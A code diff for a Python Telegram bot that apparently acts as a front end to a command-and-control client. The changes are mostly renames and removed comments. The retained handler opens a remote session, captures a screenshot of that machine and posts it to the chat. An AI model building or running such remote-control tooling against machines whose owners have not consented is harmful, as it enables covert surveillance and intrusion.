@@ -13,7 +13,7 @@ from aiogram.types import InputFile
 from aiogram.types import FSInputFile
 import os
 import asyncio
-from handlers import info
+from src import info
 
 router = Router()
 router.include_router(info.router)
@@ -28,21 +28,9 @@ reply_kb = ReplyKeyboardMarkup(
     resize_keyboard=True
 )
 
-#UUID_REGEX = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
-
 @router.message(lambda msg: msg.text == "/menu")
 async def show_reply_menu(message: types.Message):
     await message.answer("hi", reply_markup=reply_kb)
-
-#def format_time(time_to_format):
-#    last_checkin_dt = datetime.fromtimestamp(time_to_format, tz=timezone.utc)
-#    #formated_time = last_checkin_dt.strftime('%Y-%m-%d %H:%M:%S UTC')
-#    formated_time = last_checkin_dt.strftime('%Y %a %d %b %H:%M:%S UTC')
-#    current_time = datetime.now(timezone.utc)
-#    time_diff = current_time - last_checkin_dt
-#    seconds_ago = int(time_diff.total_seconds())
-#    final_time = f"{formated_time} ({seconds_ago}s ago)"
-#    return final_time 
 
 @router.message(lambda msg: msg.text == "close")
 async def close_action(message: types.Message):
@@ -60,16 +48,17 @@ async def take(message: types.Message):
     logger.info(sessions[id])
     session = await client.interact_session(sessions[id].ID)
     screen = await session.screenshot()
+
     with open("1337.png", "wb") as f:
         f.write(screen.Data)
-    photo_path = "1337.png"
-    if os.path.exists(photo_path):
-        logger.error(f"file found: {photo_path}")
+    img_path = "1337.png"
+    if os.path.exists(img_path):
+        logger.error(f"file found: {img_path}")
     else:
-        logger.error(f"file not found: {photo_path}")
-    photo = FSInputFile(photo_path)
+        logger.error(f"file not found: {img_path}")
+    img = FSInputFile(img_path)
     try:
-        await message.answer_photo(photo=photo, caption="done")
+        await message.answer_photo(photo=img, caption="done")
     except:
         await message.answer("error occured")
 
